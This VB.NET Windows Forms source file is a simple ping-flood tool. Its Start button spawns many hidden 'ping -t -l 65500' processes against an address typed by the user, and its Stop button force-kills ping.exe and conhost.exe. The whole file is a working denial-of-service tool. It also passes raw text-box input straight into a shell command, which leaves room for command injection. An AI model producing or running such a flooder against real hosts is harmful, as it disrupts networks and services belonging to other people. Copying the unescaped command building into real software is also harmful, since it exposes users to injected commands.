Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MsgBox("By Bigbutt",, "Auther")
    End Sub

    Private Sub Start_Click(sender As Object, e As EventArgs) Handles Start.Click
        Dim a As Integer
        For a = 0 To Many.Text
            Shell("ping " + Address.Text + " -t -l 65500", 0)
        Next
        Label.Text = "程序正在运行"
    End Sub

    Private Sub Stops_Click(sender As Object, e As EventArgs) Handles Stops.Click
        Shell("taskkill /im conhost.exe /f", 0)
        Shell("taskkill /im ping.exe /f", 0)
        Label.Text = ""
    End Sub
End Class